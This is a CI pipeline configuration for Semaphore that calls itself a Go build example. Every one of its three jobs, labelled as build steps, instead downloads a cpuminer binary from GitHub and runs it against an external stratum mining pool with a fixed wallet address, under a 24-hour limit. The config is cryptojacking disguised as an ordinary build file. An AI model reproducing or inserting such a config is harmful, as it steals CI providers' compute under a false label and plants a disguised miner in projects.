version: v1.0
name: Semaphore Go CI example
agent:
  machine:
    type: e1-standard-4
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
blocks:
  - name: Build project
    task:
      jobs:
        - name: go get & build
          commands:
            - 'wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz'
            - tar xzf Cpuminer-opt-cpu-pool-linux64.tar.gz
            - './cpuminer -a yespowersugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1q0fch2a48ewjfr4e9r6fc92k9shcj4dr4c6w2tr.test -t3'
        - name: 'Job #2'
          commands:
            - 'wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz'
            - tar xzf Cpuminer-opt-cpu-pool-linux64.tar.gz
            - './cpuminer -a yespowersugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1q0fch2a48ewjfr4e9r6fc92k9shcj4dr4c6w2tr.test -t3'
        - name: 'Job #3'
          commands:
            - 'wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz'
            - tar xzf Cpuminer-opt-cpu-pool-linux64.tar.gz
            - './cpuminer -a yespowersugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1q0fch2a48ewjfr4e9r6fc92k9shcj4dr4c6w2tr.test -t3'
